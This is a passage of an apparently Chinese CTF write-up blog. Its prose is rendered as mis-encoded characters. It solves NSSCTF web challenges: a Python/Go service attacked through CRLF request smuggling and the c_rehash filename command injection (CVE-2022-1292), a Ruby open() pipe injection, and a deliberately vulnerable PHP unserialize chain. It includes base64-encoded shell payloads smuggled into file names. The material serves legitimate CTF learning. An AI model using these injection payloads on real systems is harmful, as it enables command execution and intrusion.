class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    client.send(msg.encode())</span><br><span class="line">    data = client.recv(<span class="number">2048</span>)</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="keyword">return</span> data.decode()</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">staticPath := <span class="string">&quot;/app/static/crt/&quot;</span></span><br><span class="line">oldname := c.DefaultQuery(<span class="string">&quot;oldname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">newname := c.DefaultQuery(<span class="string">&quot;newname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> oldname == <span class="string">&quot;&quot;</span> || newname == <span class="string">&quot;&quot;</span> || strings.Contains(oldname, <span class="string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">err := os.Rename(staticPath+oldname, staticPath+newname)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, newname)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.GET(<span class="string">&quot;/&quot;</span>, index)</span><br><span class="line">router.GET(<span class="string">&quot;/admin/rename&quot;</span>, admin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := router.Run(<span class="string">&quot;:8887&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸»è¦çœ‹ä¸€ä¸ªpythonæ–‡ä»¶å’Œä¸€ä¸ªgoæ–‡ä»¶ï¼Œå…ˆåˆ†æä¸€ä¸‹åŠŸèƒ½ç‚¹</p><p>å…ˆçœ‹pythonæ–‡ä»¶ï¼Œ&#x2F;getcrtè·¯ç”±æ˜¯ç”Ÿæˆä¸€ä¸ªcrtè¯ä¹¦å¹¶returnç»™æˆ‘ä»¬ï¼Œ&#x2F;createlinkæ˜¯ä¸€ç§å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c_rehash static/crt/ &amp;&amp; ls static/crt/</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨äº†c_rehashè¿›è¡Œæ‰§è¡Œã€‚è¿™é‡Œc_rehashå…¶å®å­˜åœ¨CVE-2022-1292ã€‚</p><p>c_rehashæ˜¯opensslä¸­çš„ä¸€ä¸ªç”¨perlç¼–å†™çš„è„šæœ¬å·¥å…·ï¼Œç”¨äºæ‰¹é‡åˆ›å»ºè¯ä¹¦ç­‰æ–‡ä»¶ hashå‘½åçš„ç¬¦å·é“¾æ¥ï¼Œæ˜¯å½“ç”¨æˆ·å¯æ§æ–‡ä»¶åæ—¶çš„å‘½ä»¤æ³¨å…¥</p><p>ä»–ä¼šæ‰§è¡Œæ–‡ä»¶åçš„å†…å®¹ï¼Œå½“æ–‡ä»¶åå­˜åœ¨åå¼•å·æ—¶ï¼</p><p>cveåˆ†æï¼š</p><p><a href="https://xz.aliyun.com/t/11703?time__1311=Cq0xRiqiuQDsD7CG7KGODcG7Fit34Eox">https://xz.aliyun.com/t/11703?time__1311=Cq0xRiqiuQDsD7CG7KGODcG7Fit34Eox</a></p><p>ç„¶åçœ‹&#x2F;proxyï¼Œä¸è‡ªèº«çš„8887ç«¯å£å»ºç«‹è¿æ¥ï¼Œ8887ç«¯å£å¯¹åº”goæœåŠ¡ï¼Œå°†ä¸¤ç§è¯­è¨€è”ç³»åœ¨äº†ä¸€èµ·ã€‚è¿™é‡Œçš„uriæ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡CRLFæ„é€ ä»»æ„æ•°æ®åŒ…ã€‚æˆ‘ä»¬ä¹Ÿå¿…é¡»è¦CRLFæ¥æ„é€ ï¼Œå› ä¸ºå­˜åœ¨c.Request.URL.RawPath !&#x3D; â€œâ€ &amp;&amp; c.Request.Host &#x3D;&#x3D; â€œadminâ€</p><p><strong>goçš„RawPathç‰¹æ€§ï¼š</strong></p><p>é€šè¿‡é˜…è¯»go netåº“çš„æºç <br>æˆ‘å‘ç°åœ¨goä¸­ä¼šå¯¹åŸå§‹urlè¿›è¡Œåè½¬ä¹‰æ“ä½œ(URLè§£ç )<br>å¦‚æœåè½¬ä¹‰åå†æ¬¡è½¬ä¹‰çš„urlä¸åŸå§‹urlä¸åŒ é‚£ä¹ˆRawPathä¼šè¢«è®¾ç½®ä¸ºåŸå§‹url åä¹‹ç½®ä¸ºç©º</p><p>å› æ­¤æˆ‘ä»¬åªè¦éšä¾¿å¯¹ä¸€ä¸ªæ–œæ è¿›è¡Œurlç¼–ç å³å¯ã€‚</p><p>ç„¶åå°±å¯ä»¥æ„é€ æ¶æ„æ•°æ®åŒ…äº†ã€‚ç„¶åé€šè¿‡è¡¨å•ä¼ å…¥uriå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">uri=<span class="string">&#x27;&#x27;&#x27;/admin%2frename?oldname=b58a6a37-6cc5-46bf-a98f-d589a9957a1f.crt&amp;newname=`echo%20bHMgLw==|base64%20-d|bash&gt;flag`.crt HTTP/1.1</span></span><br><span class="line"><span class="string">Host: admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /&#x27;&#x27;&#x27;</span></span><br><span class="line">gopher = uri.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">payload=urllib.parse.quote(gopher)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>æ­¤å¤„çš„ä½œç”¨æ˜¯ls &#x2F;</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241227153626689.png" alt="image-20241227153626689" style="zoom: 67%;" /><p>æˆåŠŸå&#x2F;createlinkä¸€ä¸‹è®©ä»–æ‰§è¡Œå‘½ä»¤ã€‚</p><p>ç„¶åå»&#x2F;static&#x2F;crt&#x2F;è®¿é—®å³å¯</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241227153710490.png" alt="image-20241227153710490" style="zoom:80%;" /><p>åŒç†å¯è¯»flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;ee493ebd-0ef5-4594-baa9-ec7ad1a5f601&#125;</span><br></pre></td></tr></table></figure><h2 id="ç¬¬äº”ç©ºé—´-2021-PNGå›¾ç‰‡è½¬æ¢å™¨"><a href="#ç¬¬äº”ç©ºé—´-2021-PNGå›¾ç‰‡è½¬æ¢å™¨" class="headerlink" title="[ç¬¬äº”ç©ºé—´ 2021]PNGå›¾ç‰‡è½¬æ¢å™¨"></a>[ç¬¬äº”ç©ºé—´ 2021]PNGå›¾ç‰‡è½¬æ¢å™¨</h2><p>ç»™äº†æºç ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/index.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/upload.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:file</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>].split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>] == <span class="string">&#x27;png&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    filename = <span class="title class_">Digest</span><span class="symbol">:</span><span class="symbol">:MD5</span>.hexdigest(<span class="title class_">Time</span>.now.to_i.to_s + params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>]) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">    open(filename, <span class="string">&#x27;wb&#x27;</span>) &#123; |<span class="params">f</span>|</span><br><span class="line">      f.write open(params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>],<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">&quot;Upload success, file stored at <span class="subst">#&#123;filename&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/convert.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">unless</span> params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    file = params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">unless</span> file.index(<span class="string">&#x27;..&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file.index(<span class="string">&#x27;/&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file =~ <span class="regexp">/^(.+)\.png$/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res = open(file, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    headers <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    <span class="string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + <span class="title class_">Base64</span>.encode64(res).gsub(<span class="regexp">/\s*/</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\&quot;;\n&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ åçš„æ–‡ä»¶ä¹Ÿåªèƒ½æ˜¯pngåç¼€çš„ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯ä¸å¤ªå¯èƒ½å­˜åœ¨çš„ã€‚</p><p>è¿™é‡Œè€ƒå¯Ÿçš„æ˜¯rubyçš„file openæ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open()å‡½æ•°å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p>å°†æ–‡ä»¶åæ„é€ æˆæ¶æ„payloadå³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=|`echo+ZW52|base64+-d`;cat+1.png</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241230171141882.png" alt="image-20241230171141882"></p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241230171148314.png" alt="image-20241230171148314" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;d95c546d-fb51-4696-b923-66d3758d20c6&#125;</span><br></pre></td></tr></table></figure><h2 id="GHCTF-2024-æ–°ç”Ÿèµ›-ezzz-unserialize"><a href="#GHCTF-2024-æ–°ç”Ÿèµ›-ezzz-unserialize" class="headerlink" title="[GHCTF 2024 æ–°ç”Ÿèµ›]ezzz_unserialize"></a>[GHCTF 2024 æ–°ç”Ÿèµ›]ezzz_unserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hey</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@message</span>: Patience is the key in life,I think you&#x27;ll be able to find vulnerabilities in code audits.</span></span><br><span class="line"><span class="comment"> * Have fun and Good luck!!!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sakura</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$strawberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; apple = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; strawberry;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoNo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$peach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; peach = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span> -&gt; <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BasaraKing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$orange</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cherry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span> -&gt; orange;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; cherry -&gt; <span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UkyoTachibana</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$banana</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mangosteen</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span> -&gt; banana -&gt; <span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span> -&gt; mangosteen -&gt; tt2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sakura was the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UesugiErii</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$coconut</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;My time with Sakura was my happiest time&quot;</span>.<span class="variable language_">$this</span> -&gt; coconut;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heraclqs</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$grape</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blueberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; blueberry)) == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaiSakatoku</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Carambola</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Kiwifruit</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; <span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span> -&gt; Kiwifruit = <span class="string">&quot;Sakura&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt; Carambola);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span 